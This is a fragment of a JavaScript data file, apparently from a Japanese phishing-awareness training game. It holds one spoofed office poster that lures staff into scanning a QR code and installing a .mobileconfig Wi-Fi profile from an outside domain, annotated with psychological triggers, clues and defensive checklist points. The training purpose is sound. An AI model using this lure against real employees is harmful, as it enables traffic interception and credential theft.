    senderDisplay: '社内施設管理チーム & ITインフラ課 (掲示)',
    senderAddress: 'facility-wifi-setup@aoba-next-tokyo.net',
    recipientDisplay: '全社従業員および来客者各位',
    timestamp: '本日 11:30',
    content: `【8F新設カンファレンスエリア 高速Wi-Fi接続手順】

本日より8Fホールおよび全会議室にWi-Fi 7対応の超高速アクセスポイントが新設されました。
業務端末（iPhone / Android）から下記QRコードをカメラで読み取り、表示される「社内Wi-Fiプロファイル構成ファイル（.mobileconfig）」をダウンロード・インストールしてください。

[QRコード画像]
読み取り先URL：https://aoba-guest-wifi.tokyo-cloudnet.com/enroll/wifi-cert.mobileconfig

※構成プロファイルをインストールすると、社内イントラへの常時接続証明書とプロキシが自動設定されます。

総務施設課 / ITネットワーク運用係`,
    isSpoofed: true,
    attackType: 'クイッシング（QRコードフィッシング）＋ 悪意あるMDM構成プロファイル乗っ取り',
    urlInfo: {
      displayText: 'https://aoba-guest-wifi.tokyo-cloudnet.com/enroll/wifi-cert.mobileconfig',
      actualUrl: 'https://aoba-guest-wifi.tokyo-cloudnet.com/enroll/wifi-cert.mobileconfig',
      isSuspicious: true
    },
    psychologicalTriggers: [
      {
        type: 'familiarity',
        label: '社内オフィス物理空間への侵入・掲示',
        description: '「会社の会議室に貼ってあるポスターだから本物に違いない」という物理的な信用を悪用。'
      },
      {
        type: 'confusion',
        label: 'Wi-Fiプロファイル設定の技術的煙幕',
        description: '「高速Wi-Fi接続のため」と偽り、スマホの全通信を盗聴できる危険なプロファイルを入れさせる。'
      }
    ],
    clues: [
      {
        id: 'clue_h20_mobileconfig',
        targetArea: 'url',
        label: '悪意ある「.mobileconfig（構成プロファイル）」のインストール指示',
        isSuspicious: true,
        explanation: 'iOS端末に外部の.mobileconfigプロファイルを入れると、攻撃者のルートCA証明書と常時VPN/プロキシが設定され、通信内容（暗号化されたパスワードや決済情報含む）がすべて第三者に盗聴されます。'
      },
      {
        id: 'clue_h20_qr_domain',
        targetArea: 'url',
        label: 'QRコード先が外部ドメイン（tokyo-cloudnet.com）',
        isSuspicious: true,
        explanation: '自社の正規ドメイン（aoba-next.jp）ではなく、不審な外部クラウドホストに誘導しています。'
      }
    ],
    explanation: {
      summary: '物理ポスターのQRコードを悪用した「クイッシング（QR詐欺）＆ プロファイル乗っ取り」です。',
      whySafeOrSpoofed: 'オフィスや会議室に悪意ある第三者がQRコード付きポスターを勝手に掲示（またはすり替え）し、スマホに監視プロファイル（.mobileconfig）を入れさせて端末を完全盗聴しようとしています。',
      psychologicalTrap: '「オフィスの壁に貼ってあるから安全」という物理的環境への無防備な信頼を突き、メールフィルタの監視対象外であるQRコードを使って侵入を図ります。',
      checklistPoints: [
        'オフィスの掲示物であっても、QRコードから身元不明の構成プロファイルをインストールしない',
        '会社のWi-Fi設定手順は、必ず社内ポータルの公式マニュアルと照合する',
        'スマートフォンに「プロファイルのインストール」「ルート証明書の信頼」が表示されたら絶対に中断する'
      ],
      defenseRule: 'QRコードから提示される構成プロファイル（.mobileconfig）は通信盗聴の危険があるため絶対にインストールしない。'
    }
  }
];
